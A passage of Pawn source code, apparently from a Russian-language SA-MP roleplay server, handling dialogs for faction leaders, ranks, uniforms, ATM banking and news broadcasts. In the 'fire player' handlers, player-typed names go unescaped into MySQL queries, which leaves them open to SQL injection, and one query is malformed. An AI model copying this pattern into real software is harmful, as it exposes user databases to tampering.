			MysqlUpdatePlayerInt(actplayerid, "spawnchange", PI[actplayerid][pSpawnChange]);
			MysqlUpdatePlayerInt(actplayerid, "lwarn", PI[actplayerid][pLWarn]);
			PI[actplayerid][pMemberSkin] = skinid;
			SetPlayerSkin(actplayerid, PI[actplayerid][pMemberSkin]);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET memberskin=%d, leader=%d, member=%d, rank=%d, job=0 WHERE name='%s'", PI[actplayerid][pMemberSkin], PI[actplayerid][pLeader], PI[actplayerid][pMember], PI[actplayerid][pRank], GetName(actplayerid));
			mysql_query(dbHandle, STRING_GLOBAL);

			format(string, sizeof(string), "Вы назначили %s лидером организации: %s", GetName(actplayerid), Fraction_Name[fractionid]);
			SendClientMessage(playerid, COLOR_LIME, string);
			format(string, sizeof(string), "Администратор %s назначил Вас лидером организации: %s", GetName(playerid), Fraction_Name[fractionid]);
			SendClientMessage(actplayerid, COLOR_BLUE, string);
			format(string, sizeof(string), "[A] %s назначил %s лидером организации \"%s\"", GetName(playerid), GetName(actplayerid), Fraction_Name[fractionid]);
			SendAdminMessage(COLOR_GREY, string);
			ResetPlayerWeapons(actplayerid);
			SetPlayerColorEx(actplayerid, TeamColors[GetTeamID(actplayerid)]);
			DeletePVar(playerid, "actplayerid");
			DeletePVar(playerid, "actfraction");
	    }
	case D_TEMPLEADER:
		{
			if(!response) return 1;
			new fractionid = listitem+1;
			switch(fractionid)
			{
			    case TEAM_ARMIYA,TEAM_POLICIA,TEAM_POLICIA2,TEAM_SWAT: PI[playerid][pRank] = 1;
			    case TEAM_FBI: PI[playerid][pRank] = 1;
			    case TEAM_MERIA,TEAM_VDV,TEAM_PRAVO,TEAM_BOLNICA,TEAM_SFHOSPITAL,TEAM_LVHOSPITAL,TEAM_GROOVE..TEAM_VAGOS,TEAM_OPG1..TEAM_YAK,TEAM_SMI,TEAM_SFNEWS,TEAM_LVNEWS: PI[playerid][pRank] = 1;
			    case TEAM_AUTOSCHOOL: PI[playerid][pRank] = 1;
			    case 13,14: return 1;
			}
			PI[playerid][pTempLeader] = PI[playerid][pMember] = fractionid;
			PI[playerid][pJob] = 0;
			PI[playerid][pMemberSkin] = GetPlayerSkin(playerid);
			PI[playerid][pSpawnChange] = 2;
			MysqlUpdatePlayerInt(playerid, "spawnchange", PI[playerid][pSpawnChange]);
			new string[128];
		    format(string, sizeof(string), "Вы тихо вступили в организации: %s", Fraction_Name[fractionid]);
			SendClientMessage(playerid, COLOR_LIME, string);
			format(string, sizeof(string), "[A] %s тихо вступили в организации \"%s\"", GetName(playerid), Fraction_Name[fractionid]);
			SendAdminMessage(COLOR_GREY, string);
			ResetPlayerWeapons(playerid);
			SetPlayerColorEx(playerid, TeamColors[GetTeamID(playerid)]);
			MysqlUpdatePlayerInt(playerid, "templeader", PI[playerid][pTempLeader]);
			MysqlUpdatePlayerInt(playerid, "memberskin", PI[playerid][pMemberSkin]);
			MysqlUpdatePlayerInt(playerid, "rank", PI[playerid][pRank]);
			MysqlUpdatePlayerInt(playerid, "job", PI[playerid][pJob]);
	    }
		case D_FRACMENU+1:
		{
			if(!response)
			{
				DeletePVar(playerid, "PlayerRank");
				return 1;
			}
			// TEAM_ARMIYA
			new targetid = GetPVarInt(playerid, "PlayerRank");
			if(!IsPlayerConnected(targetid)) return SendMess(playerid, MSG_PLAYER_OFFLINE);
			if(PlayerLogged[targetid] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
			if(PI[targetid][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
			if(PI[targetid][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
			if(PI[targetid][pMember] != PI[playerid][pMember]) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
			if(PI[targetid][pRank] == PI[playerid][pRank]) return SendClientMessage(playerid, COLOR_GREY, "Заму нельзя назчначить ранг!");
			DeletePVar(playerid, "PlayerRank");
			PI[targetid][pRank] = listitem+1;

			if(PI[targetid][pMember] == TEAM_ARMIYA && PI[targetid][pVoennik] == 0 && PI[targetid][pRank] >= 3)
			{
				PI[targetid][pVoennik] = 1;
				MysqlUpdatePlayerInt(targetid, "Voennik", PI[targetid][pVoennik]);
				SendClientMessage(targetid, C_BLUE, "Вам был выдан военный билет.");
				SendClientMessage(playerid, C_BLUE, "Выбранный вами игрок получил военный билет.");
			}

			SendMes(targetid,COLOR_BLUE,"%s %s повысил/понизил Ваш ранг. Сейчас Вы: %s",Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid),Fraction_Rang[PI[targetid][pMember]][PI[targetid][pRank]]);
			SendMes(playerid,COLOR_BLUE,"Вы повысили/понизили ранг %s. Сейчас он/она: %s",GetName(targetid), Fraction_Rang[PI[targetid][pMember]][PI[targetid][pRank]]);
			MysqlUpdatePlayerInt(targetid, "rank", PI[targetid][pRank]);
		}
	case D_FRACMENU+2:
		{
			new targetid = GetPVarInt(playerid, "PlayerRank");
			if(!response) { DeletePVar(playerid, "PlayerRank"); return 1; }
			if(!IsPlayerConnected(targetid)) return SendMess(playerid, MSG_PLAYER_OFFLINE);
			if(PlayerLogged[targetid] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
			if(PI[targetid][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
			if(PI[targetid][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
			DeletePVar(playerid, "PlayerRank");
			PI[targetid][pRank] = listitem+1;
			SendMes(targetid,COLOR_BLUE,"Администратор %s повысил/понизил Ваш ранг. Сейчас Вы: %s",GetName(playerid),Fraction_Rang[PI[targetid][pMember]][PI[targetid][pRank]]);
			SendMes(playerid,COLOR_LIME,"Вы повысили/понизили ранг %s. Сейчас он/она: %s",GetName(targetid), Fraction_Rang[PI[targetid][pMember]][PI[targetid][pRank]]);
			MysqlUpdatePlayerInt(targetid, "rank", PI[targetid][pRank]);
		}
	case D_FRACMENU+7:
		{
			if(!response) return 1;
			switch(listitem)
			{
				case 0: callcmd::find(playerid);
				case 1:
				{
					STRING_GLOBAL[0] = EOS;
				    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE member = '%i' AND online = '0'", PI[playerid][pMember]);
                    mysql_tquery(dbHandle, STRING_GLOBAL, "OfflineMembersOnFraction", "i", playerid);
				}
				case 2: ShowPlayerDialog(playerid, D_LPANEL, DIALOG_STYLE_INPUT, "Уволить игрока", "{FFFFFF}Введите ник игрока, которого Вы хотите уволить:", "Далее", "Отмена");
			}
   		}
	case D_FRACMENU+8:
	    {
	        if(!response) return 1;
	        new actplayerid = GetPVarInt(playerid, "actplayerid");
	        new fractionid = PI[actplayerid][pMember];
	        new skinid = Fraction_Skin[fractionid][listitem];
	        if(skinid == PI[actplayerid][pMemberSkin]) return 1;
	        new mes[128];
			format(mes,sizeof(mes), "%s выдал Вам новую фракционную одежду", GetName(playerid));
			SendClientMessage(actplayerid, COLOR_BLUE, mes);
			format(mes,sizeof(mes), "%s получил новую фракционную одежду", GetName(actplayerid));
			SendClientMessage(playerid, COLOR_BLUE, mes);
	        PI[actplayerid][pMemberSkin] = skinid;
			MysqlUpdatePlayerInt(actplayerid, "memberskin", PI[actplayerid][pMemberSkin]);
	        SetPlayerSkin(actplayerid, skinid);
			DeletePVar(playerid, "actplayerid");
	    }
    case D_LPANEL:
	    {
	        if(!response) return 1;
	    	for(new i = strlen(inputtext); i != 0; --i)
	    	switch(inputtext[i])
			{
				case 'А'..'Я', 'а'..'я', ' ': //
				return SendClientMessage(playerid,COLOR_GREY,"Используйте только английские буквы!");
			}
   			if(!strlen(inputtext) || strlen(inputtext) < 1 || strlen(inputtext) > 40 || IsTextRussian(inputtext))
			{
			    ShowPlayerDialog(playerid, D_LPANEL, DIALOG_STYLE_INPUT, "{ffffff}Уволить игрока", "Введите ник игрока, которого Вы хотите уволить:", "Далее","Отмена");
		    }
			else
			{
				STRING_GLOBAL[0] = EOS;
			    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE name = '%s' AND online = '0' AND member = '%i' LIMIT 1",inputtext,PI[playerid][pMember]);
                mysql_tquery(dbHandle, STRING_GLOBAL, "OfflineUninviteOnFraction", "i", playerid);
			}
		}
	case D_LPANEL+1:
	    {
	        if(!response) return 1;
	    	for(new i = strlen(inputtext); i != 0; --i)
	    	switch(inputtext[i])
			{
				case 'А'..'Я', 'а'..'я', ' ': //
				return SendClientMessage(playerid,COLOR_GREY,"Используйте только английские буквы!");
			}
   			if(!strlen(inputtext) || strlen(inputtext) < 1 || strlen(inputtext) > 40 || IsTextRussian(inputtext))
			{
			    ShowPlayerDialog(playerid, D_LPANEL+1, DIALOG_STYLE_INPUT, "{ffffff}Уволить лидера", "Введите ник игрока, которого Вы хотите снять:", "Далее","Отмена");
		    }
			else
			{
				STRING_GLOBAL[0] = EOS;
			    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" SET leader = '0', member = '0', rank = '0', memberskin = '0' WHERE name = '%s' LIMIT 1",inputtext);
                mysql_tquery(dbHandle, STRING_GLOBAL, "OfflineUninviteOnFraction", "i", playerid);
			}
		}
	case D_ATM+9:
		{
			if(!response) return 1;
			new Float:x, Float:y, Float:z, Float:angle;
			GetPlayerPos(playerid, x, y, z);
			GetPlayerFacingAngle(playerid, angle);
			x += floatsin(-angle, degrees);
			y += floatcos(-angle, degrees);
			new atm1;
			SendClientMessage(playerid, COLOR_LIGHTRED, "Чтобы выйти, нажмите: ESC и чтобы сохранить, нажмите курсором: СОХРАНИТЬ");
			atm1 = CreateObject(2942, x, y, z-0.35, 0.0, 0.0, 0.0);
			SetPVarInt(playerid, "LoadATM", atm1+1);
			EditObject(playerid, atm1);
		}
	case D_ATM+5:
		{
			if(!response) return 1;
			switch(listitem)
			{
				case 0:
				{
				    new string[90];
					format(string, 90, "{ffffff}Баланс банковского счёта: {63BD4E}%iр", PI[playerid][pBank]);
					ShowPlayerDialog(playerid, D_NULL, 0, "Баланс", string, "Назад", "");
				}
				case 1: ShowPlayerDialog(playerid, 5050, 1, "Пополнение", "{FFFFFF}Введите количество денег\nна которое хотите пополнить банковский счёт", "Принять", "Назад");
				case 2: ShowPlayerDialog(playerid, D_ATM+8, 1, "Снять со счета", "{FFFFFF}Введите количество денег\nкоторое хотите снять с банковского счёта", "Принять", "Назад");
				case 3:
				{
				    if(!TransferReset[playerid])
					{
						if(PI[playerid][pLevel] >= 7) ShowPlayerDialog(playerid, D_LIC+4, 1, "Перевод", "{FFFFFF}Введите ID или имя игрока и количество денег через запятую\n\nПример: Ivan_Ivanov, 10000", "Принять", "Назад");
						else SendClientMessage(playerid,COLOR_GREY,"Переводить деньги можно только с 7-го уровня");
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "Переводить деньги можно только раз в минуту.");
					}
				}
				case 4:
				{
					if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет дома!");
					new h = GetPVarInt(playerid, "PlayerHouse");
					ShowPlayerDialogPayHouse(playerid, h);
				}
				case 5:
				{
					new b = GetPVarInt(playerid, "PlayerBizz");
					if(GetPlayerBizz(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете бизнесом!");
					new string[128];
					format(string, sizeof(string), "{FFFFFF}Введите сумму пополнения\nТекущий счет бизнеса: %dр", BizzInfo[b][bMoney]);
					ShowPlayerDialog(playerid, D_HEAL+21, 1, "Пополнение счета бизнеса", string, "Принять", "Назад");
				}
				case 6:
				{

					new b = GetPVarInt(playerid, "PlayerBizz");
					if(GetPlayerBizz(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете бизнесом!");
					new string[128];
					format(string, sizeof(string), "{FFFFFF}Введите сумму вывода денег с бизнеса\nТекущий счет бизнеса: %dр", BizzInfo[b][bMoney]);
					ShowPlayerDialog(playerid, D_HEAL+213, 1, "Вывод счета с бизнеса", string, "Принять", "Назад");
				}
			}
		}
	case D_ATM+932:
		{
			if(!response) return 1;
			switch(listitem)
			{
				case 0:
				{
				    new string[90];
					format(string, 90, "{ffffff}Баланс банковского счета: {63BD4E}%iр", PI[playerid][pBank]);
					ShowPlayerDialog(playerid, D_NULL, 0, "Баланс", string, "Назад", "");
				}
				case 1: ShowPlayerDialog(playerid, D_ATM+12, 1, "Пополнение", "{FFFFFF}Введите количество денег\nна которое хотите пополнить банковский счёт", "Принять", "Назад");
				case 2: ShowPlayerDialog(playerid, D_ATM+11, 1, "Снять со счета", "{FFFFFF}Введите количество денег\nкоторое хотите снять с банковского счёта", "Принять", "Назад");
				case 3:
				{
				    if(GetPlayerHouse(playerid) > 0)
					{
						new h = GetPVarInt(playerid, "PlayerHouse");
						ShowPlayerDialogPayHouse(playerid, h);
					}
					else SendClientMessage(playerid, COLOR_GREY, "У Вас нет квартиры/дома!");
				}
				case 4:
				{
				    new string[150];
				    if(PI[playerid][pPhoneNumber] <= 1)
					{
						SendClientMessage(playerid, COLOR_GREY, "У Вас нет Sim-Card!");
						return 1;
					}
					format(string, sizeof(string), "{FFFFFF}Введите сумму пополнения\n\nКомиссия за операцию: {1D99D4}0%%\n\n{FFFFFF}Текущее состояние счёта: {63BD4E}%dр", PI[playerid][pPhoneBalance]);
					ShowPlayerDialog(playerid, D_ATM+1, 1, "Пополнение счета телефона", string, "Принять", "Назад");
				}
				case 5:
				{
					if(GetPlayerBizz(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете бизнесом!");
					new string[128];
					format(string, sizeof(string), "{FFFFFF}Введите сумму пополнения\nТекущий счет бизнеса: %dр", BizzInfo[GetPVarInt(playerid, "PlayerBizz")][bMoney]);
					ShowPlayerDialog(playerid, D_HEAL+21, 1, "Пополнение счета бизнеса", string, "Принять", "Назад");
				}
				case 6:
				{
				    new string[150];
				    format(string, sizeof(string), "{FFFFFF}Введите количество денег, которые хотите пожертвовать на благотворительность\n\nВы пожертвовали: {63BD4E}%dр", PI[playerid][pCharity]);
				    ShowPlayerDialog(playerid, D_ATM+4, 1, "Благотворительность", string, "Принять", "Назад");
				}
			}
		}
	case 5050:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, 5050, 1, "Пополнение", "{FFFFFF}Введите количество денег\nна которое хотите пополнить банковский счёт", "Принять", "Назад");
			if(price < 1) return ShowPlayerDialog(playerid, 5050, 1, "Пополнение", "{FFFFFF}Введите количество денег\nна которое хотите пополнить банковский счёт", "Принять", "Назад");
			if(GetMoney(playerid) < price) { ShowPlayerDialog(playerid, 5050, 1, "Пополнение", "{FFFFFF}Введите количество денег\nна которое хотите пополнить банковский счёт", "Принять", "Назад"); return SendMess(playerid, MSG_NOT_MONEY); }

			if(PI[playerid][pBank] + price >= 999999999)
				return SendClientMessage(playerid, C_RED, "На банковском счету запрещено иметь более 999999999 рублей");

			GiveBankMoney(playerid, price, "PutMoney");
			GiveMoney(playerid, -price);
			SendMes(playerid, COLOR_LIME, "Вы положили на счет: %iр. На счету: %iр", price, PI[playerid][pBank]);
			MysqlUpdatePlayerInt(playerid, "bank", PI[playerid][pBank]);
			return 1;
		}
	case D_ATM+8:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_ATM+8, 1, "Снять со счета", "{FFFFFF}Введите количество денег\nкоторое хотите снять с банковского счёта", "Принять", "Назад");
			if(price < 1) return ShowPlayerDialog(playerid, D_ATM+8, 1, "Снять со счета", "{FFFFFF}Введите количество денег\nкоторое хотите снять с банковского счёта", "Принять", "Назад");
			if(PI[playerid][pBank] < price) { ShowPlayerDialog(playerid, D_ATM+8, 1, "Снять со счета", "{FFFFFF}Введите количество денег\nкоторое хотите снять с банковского счёта", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "На вашем счету в банке не хватает денег!"); }

			if(PI[playerid][pCash] + price >= 999999999)
				return SendClientMessage(playerid, C_RED, "На руках запрещено иметь более 999999999 рублей");

			GiveBankMoney(playerid, -price, "TakeMoney");
			GiveMoney(playerid, price);
			SendMes(playerid, COLOR_LIME, "Вы сняли со счета: %iр. На счету: %iр", price, PI[playerid][pBank]);
			MysqlUpdatePlayerInt(playerid, "bank", PI[playerid][pBank]);
			return 1;
		}
    case D_ATM+12:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_ATM+12, 1, "Пополнение", "{FFFFFF}Введите количество денег\nна которое хотите пополнить банковский счёт", "Принять", "Назад");
			if(price < 1) return ShowPlayerDialog(playerid, D_ATM+12, 1, "Пополнение", "{FFFFFF}Введите количество денег\nна которое хотите пополнить банковский счёт", "Принять", "Назад");
			if(GetMoney(playerid) < price) { ShowPlayerDialog(playerid, D_ATM+12, 1, "Пополнение", "{FFFFFF}Введите количество денег\nна которое хотите пополнить банковский счёт", "Принять", "Назад"); return SendMess(playerid, MSG_NOT_MONEY); }

			if(PI[playerid][pBank] + price >= 999999999)
				return SendClientMessage(playerid, C_RED, "На банковском счету запрещено иметь более 999999999 рублей");

			GiveBankMoney(playerid, price, "PutMoney");
			GiveMoney(playerid, -price);
			SendMes(playerid, COLOR_LIME, "Вы положили на счет: %iр. На счету: %iр", price, PI[playerid][pBank]);
			return 1;
		}
	case D_ATM+11:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_ATM+8, 1, "Снять со счета", "{FFFFFF}Введите количество денег\nкоторое хотите снять с банковского счёта", "Принять", "Назад");
			if(price < 1) return ShowPlayerDialog(playerid, D_ATM+8, 1, "Снять со счета", "{FFFFFF}Введите количество денег\nкоторое хотите снять с банковского счёта", "Принять", "Назад");
			if(PI[playerid][pBank] < price) { ShowPlayerDialog(playerid, D_ATM+8, 1, "Снять со счета", "{FFFFFF}Введите количество денег\nкоторое хотите снять с банковского счёта", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, "На вашем счету в банке не хватает денег!"); }

			if(PI[playerid][pCash] + price >= 999999999)
				return SendClientMessage(playerid, C_RED, "На руках запрещено иметь более 999999999 рублей");

			GiveBankMoney(playerid, -price, "TakeMoney");
			GiveMoney(playerid, price);
			SendMes(playerid, COLOR_LIME, "Вы сняли со счета: %iр. На счету: %iр", price, PI[playerid][pBank]);
			return 1;
		}
	case D_NMENU:
		{
			if(!response) return 1;
			switch(listitem)
			{
				case 0:
				{
					new full = 0, CB[16];
					foreach(new i: Player)
					{
						if(PlayerLogged[i] == false || playerid == i) continue;
						if(Ether[i] == true && PI[i][pMember] == PI[playerid][pMember]) full++;
					}
					if(full > 0) return SendClientMessage(playerid, COLOR_GREY, "Эфир занят! В эфире находиться Ваш коллега!");
					if(Ether[playerid] == false)
					{
						if(PI[playerid][pMember] == TEAM_SMI && PI[playerid][pNews] != 1) PI[playerid][pNews] = 1;
						else if(PI[playerid][pMember] == TEAM_SFNEWS && PI[playerid][pNews] != 2) PI[playerid][pNews] = 2;
						else if(PI[playerid][pMember] == TEAM_LVNEWS && PI[playerid][pNews] != 3) PI[playerid][pNews] = 3;
						Ether[playerid] = true;
						new string[90];
						format(string, 90, "[F] %s вошел в прямой эфир",GetName(playerid));
						SendFMes(PI[playerid][pMember], COLOR_LIGHTBLUE, string);
					}
					else if(Ether[playerid] == true)
					{
						Ether[playerid] = false;
						new string[90];
						Convert(GetPVarInt(playerid,"InEther"),CB);
						if(EtherSms[PI[playerid][pNews]-1] == true) { format(string, 90, "[F] %s выключил прием СМС",GetName(playerid)); SendFMes(PI[playerid][pMember], COLOR_LIGHTRED, string); }
						if(EtherCall[PI[playerid][pNews]-1] == true) { format(string, 90, "[F] %s выключил прием звонков",GetName(playerid)); SendFMes(PI[playerid][pMember], COLOR_LIGHTRED, string); }
						format(string, 90, "[F] %s вышел из прямого эфира (Время в эфире: %s, звонков: %i, СМС: %i)",GetName(playerid), CB, CallNews[PI[playerid][pNews]-1], SmsNews[PI[playerid][pNews]-1]);
						SendFMes(PI[playerid][pMember], COLOR_LIGHTRED, string);
						SmsNews[PI[playerid][pNews]-1] = 0;
						CallNews[PI[playerid][pNews]-1] = 0;
						EtherSms[PI[playerid][pNews]-1] = false;
						EtherCall[PI[playerid][pNews]-1] = false;
						DeletePVar(playerid, "InEther");
						if(Mobile[playerid] != -1) MobileCrash(playerid);
					}
				}
				case 1:
				{
					if(Ether[playerid] == false) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в прямом эфире!");
					ShowPlayerDialog(playerid, D_NMENU+1, 1, "Эфир", "{FFFFFF}Введите ID или имя игрока:", "Принять", "Отмена");
				}
				case 2:
				{
					if(Ether[playerid] == false) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в прямом эфире!");
					ShowPlayerDialog(playerid, D_NMENU+2, 1, "Эфир", "{FFFFFF}Введите ID или имя игрока:", "Принять", "Отмена");
				}
				case 3:
				{
					if(Ether[playerid] == false) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в прямом эфире!");
					new full = 0;
					full = (PI[playerid][pMember] == TEAM_SMI) ? (0) : (PI[playerid][pMember] == TEAM_SFNEWS) ? (1) : (2);
					new string[90];
					if(EtherCall[full] == false)
					{
						EtherCall[full] = true;
						format(string, 90, "[F] %s включил прием звонков",GetName(playerid));
						SendFMes(PI[playerid][pMember], COLOR_GREEN, string);
					}
					else
					{
						EtherCall[full] = false;
						format(string, 90, "[F] %s выключил прием звонков",GetName(playerid));
						SendFMes(PI[playerid][pMember], COLOR_RED, string);
					}
				}
				case 4:
				{
					if(Ether[playerid] == false) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в прямом эфире!");
					new full = 0;
					full = (PI[playerid][pMember] == TEAM_SMI) ? (0) : (PI[playerid][pMember] == TEAM_SFNEWS) ? (1) : (2);
					new string[90];
					if(EtherSms[full] == false)
					{
						EtherSms[full] = true;
						format(string, 90, "[F] %s включил прием СМС",GetName(playerid));
						SendFMes(PI[playerid][pMember], COLOR_GREEN, string);
					}
					else
					{
						EtherSms[full] = false;
						format(string, 90, "[F] %s выключил прием СМС",GetName(playerid));
						SendFMes(PI[playerid][pMember], COLOR_RED, string);
					}
				}
				case 5: AdvertList(playerid);
			}
		}
	case D_NMENU+1:
		{
			if(!response) return 1;
			new targetid;
			if(sscanf(inputtext, "u",targetid)) ShowPlayerDialog(playerid, D_NMENU+1, 1, "Эфир", "{FFFFFF}Введите ID или имя игрока:", "Принять", "Отмена");
			if(targetid == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете пригласить себя!");
			if(!IsPlayerConnected(targetid)) return SendMess(playerid, MSG_PLAYER_OFFLINE);
			if(PlayerLogged[targetid] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
			if(IsPlayerInAnyVehicle(playerid)&&!IsPlayerInVehicle(targetid, GetPlayerVehicleID(playerid)) || !IsPlayerInAnyVehicle(playerid) && !IsPlayerInRangeOfPlayer(10.0, playerid, targetid)) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться с вами в транспорте!");
			if(EtherLive[targetid] == true) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже в прямом эфире!");
			if(PI[playerid][pMember] == TEAM_SMI && PI[targetid][pNews] != 1)
			{
				SendMes(playerid, COLOR_GREY, "Игрок должен слушать радио: %s", Fraction_Name[TEAM_SMI]);
				return 1;
			}
			else if(PI[playerid][pMember] == TEAM_SFNEWS && PI[targetid][pNews] != 2)
			{
				SendMes(playerid, COLOR_GREY, "Игрок должен слушать радио: %s", Fraction_Name[TEAM_SFNEWS]);
				return 1;
			}
			else if(PI[playerid][pMember] == TEAM_LVNEWS && PI[targetid][pNews] != 3)
			{
				SendMes(playerid, COLOR_GREY, "Игрок должен слушать радио: %s", Fraction_Name[TEAM_LVNEWS]);
				return 1;
			}
			EtherLive[targetid] = true;
			SetPVarInt(targetid, "Etherfrac", PI[playerid][pMember]);
			SendMes(playerid, COLOR_LIGHTBLUE, "Вы пригласили в эфир: %s", GetName(targetid));
			SendMes(targetid, COLOR_LIGHTBLUE, "%s пригласил Вас в эфир", GetName(playerid));
		}
	case D_NMENU+2:
		{
			if(!response) return 1;
			new targetid;
			if(sscanf(inputtext, "u",targetid)) ShowPlayerDialog(playerid, D_NMENU+2, 1, "Эфир", "{FFFFFF}Введите ID или имя игрока:", "Принять", "Отмена");
			if(targetid == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете выпроводить себя!");
			if(!IsPlayerConnected(targetid)) return SendMess(playerid, MSG_PLAYER_OFFLINE);
			if(PlayerLogged[targetid] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
			if(IsPlayerInAnyVehicle(playerid)&&!IsPlayerInVehicle(targetid, GetPlayerVehicleID(playerid)) || !IsPlayerInAnyVehicle(playerid) && !IsPlayerInRangeOfPlayer(10.0, playerid, targetid)) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться с вами в транспорте!");
			if(EtherLive[targetid] == false) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в прямом эфире!");
			EtherLive[targetid] = false;
			DeletePVar(targetid, "Etherfrac");
			SendMes(playerid, COLOR_LIGHTRED, "Вы выпроводили из эфира: %s", GetName(targetid));
			SendMes(targetid, COLOR_LIGHTRED, "%s выпроводил Вас из эфира", GetName(playerid));
		}
	case D_NMENU+3:
		{
			if(!response) return 1;
			switch(listitem)
			{
				case 0:
				{
					new string[28];
					format(string, sizeof(string), "Вы слушаете радио: %s",
					(listitem == 0) ? ("станция: Ритм") : (listitem == 1) ? ("Закрыто") : ("Закрыто")); // : (listitem == 1) ? ("Закрыто") : ("Закрыто")
					SendClientMessage(playerid, COLOR_WHITE, string);
					PI[playerid][pNews] = listitem+1;
					MysqlUpdatePlayerInt(playerid, "news", PI[playerid][pNews]);
				}
				case 1:
				{
					SendClientMessage(playerid, COLOR_LIGHTRED, "Вы выключили радио");
					PI[playerid][pNews] = 0;
					MysqlUpdatePlayerInt(playerid, "news", PI[playerid][pNews]);
				}
			}
		}
	case D_NMENU+4:
		{
			if(!response) return 1;
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid, D_NMENU+9, 1, "Панель", "{FFFFFF}Введите цену за 1 секунду в эфире\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 1р до 3р", "Принять", "Отмена");
				case 1: ShowPlayerDialog(playerid, D_NMENU+10, 1, "Панель", "{FFFFFF}Введите цену за СМС\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 10р до 20р", "Принять", "Отмена");
				case 2: ShowPlayerDialog(playerid, D_NMENU+11, 1, "Панель", "{FFFFFF}Введите цену за 1 символ объявления\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 5р до 50р", "Принять", "Отмена");//убрать
			}
		}
	case D_NMENU+5:
		{
			if(!response) return 1;
			DeletePVar(playerid, "AdvertID");
			SetPVarInt(playerid, "AdvertID", listitem+1);
			ShowPlayerDialog(playerid, D_NMENU+6, 2, "Объявления", "Прочитать объявление\nРедактировать объявление\nУдалить объявление\nОтправить объявление\nОтправить администрации", "Принять", "Назад");
		}
	case D_NMENU+6:
		{
			if(!response) { DeletePVar(playerid, "AdvertID"); return AdvertList(playerid); }
   			new full = 0;
			full = (PI[playerid][pMember] == TEAM_SMI) ? (0) : (1);
			new string[150];
			switch(listitem)
			{
				case 0:
				{

					format(string, sizeof(string), "{FFFFFF}Текст: %s - Прислал: %s",AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aText],AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aName]);
					ShowPlayerDialog(playerid, D_NMENU+7, 0, "Объявления", string, "Назад", "");
				}
				case 1:
				{
					format(string, sizeof(string), "{FFFFFF}Текст: %s - Прислал: %s",AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aText],AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aName]);
					ShowPlayerDialog(playerid, D_NMENU+8, 1, "Объявления", string, "Принять", "Назад");
				}
				case 2:
				{
					for(new i = GetPVarInt(playerid, "AdvertID"); i <= TOTALADVERT[full] - 1; i++)
					{
					    AdvertInfo[i][full][aPhone] = AdvertInfo[i+1][full][aPhone];
					    strmid(AdvertInfo[i][full][aText],AdvertInfo[i+1][full][aText],0,strlen(AdvertInfo[i+1][full][aText]), 128);
					    strmid(AdvertInfo[i][full][aName],AdvertInfo[i+1][full][aName],0,strlen(AdvertInfo[i+1][full][aName]), MAX_PLAYER_NAME);
					}
					if(TOTALADVERT[full] > 0) TOTALADVERT[full]--;
					SendClientMessage(playerid, COLOR_LIGHTRED, "Объявление удалено");
					DeletePVar(playerid, "AdvertID");
					AdvertList(playerid);
				}
				case 3:
				{
					if(AdvertTime > gettime())
					{
						DeletePVar(playerid, "AdvertID");
						SendClientMessage(playerid, COLOR_GREY, "Отправлять объявление можно раз в 30 секунд!");
						return AdvertList(playerid);
					}
					format(string, sizeof(string), "%s Отправитель: %s (тел.: %i)",AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aText], AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aName], AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aPhone]);
					SendClientMessageToAll(COLOR_GREEN, string);
					format(string, sizeof(string), "   Проверил объявление %s: %s",Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
